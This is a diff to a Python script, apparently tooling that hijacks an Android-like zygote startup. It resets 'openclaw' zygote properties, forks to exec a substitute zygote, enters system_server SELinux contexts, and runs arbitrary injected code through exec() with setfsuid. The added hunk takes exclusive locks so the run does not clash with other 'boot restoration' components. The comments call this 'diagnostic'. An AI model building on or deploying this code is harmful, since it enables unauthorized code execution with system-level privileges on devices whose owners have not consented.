@@ -17,7 +17,7 @@ def gw(c):
  return d
 assert sh('getprop persist.openclaw.zygote.path')==''
 src='''#!/usr/bin/python3
-import os,sys,json,socket,struct,ctypes,mmap,time,signal,base64,hashlib,binascii,stat,errno,re,subprocess,select,sqlite3
+import os,sys,json,socket,struct,ctypes,mmap,time,signal,base64,hashlib,binascii,stat,errno,re,subprocess,select,sqlite3,fcntl
 lib=ctypes.CDLL(None,use_errno=True)
 host='/proc/'+str(os.getppid())+'/root'
 def prop(name,value):
@@ -28,6 +28,15 @@ def prop(name,value):
   if len(r)!=4 or struct.unpack('<I',r)[0]!=0:raise RuntimeError('property restore failed')
  finally:s.close()
 prop('persist.openclaw.zygote.path','');prop('sys.openclaw.env.start','')
+# Keep the existing boot adapters out of this diagnostic operation. File locks
+# survive fork in the worker; the factory launcher closes its copies on exec.
+boot_locks=[];lock_error=None
+try:
+ for path in ('/var/lib/stepx-gms/lock','/var/lib/stepx-companion/lock'):
+  if not os.path.isdir(os.path.dirname(path)):continue
+  fd=os.open(path,os.O_RDWR|os.O_CREAT,0o600);boot_locks.append(fd)
+  fcntl.flock(fd,fcntl.LOCK_EX|fcntl.LOCK_NB)
+except OSError:lock_error='Existing boot restoration is active; no diagnostic executed'
 child=os.fork()
 if child:
  os.execv('/usr/local/bin/ubuntu_zygote',['/usr/local/bin/ubuntu_zygote'])
@@ -41,7 +50,9 @@ for domain in ['u:r:system_server_startup:s0','u:r:system_server:s0']:
 def expired(a,b):raise TimeoutError('worker deadline')
 signal.signal(signal.SIGALRM,expired);signal.alarm(25)
 out={'configuration_restored':True,'uid':os.getuid(),'euid':os.geteuid(),'context':open('/proc/self/attr/current').read().strip('\\x00\\n')}
-try:exec(CODE,globals(),locals())
+try:
+ if lock_error:raise RuntimeError(lock_error)
+ exec(CODE,globals(),locals())
 except BaseException as e:out['error']=repr(e)
 finally:
  signal.alarm(0);lib.setfsuid(1000)
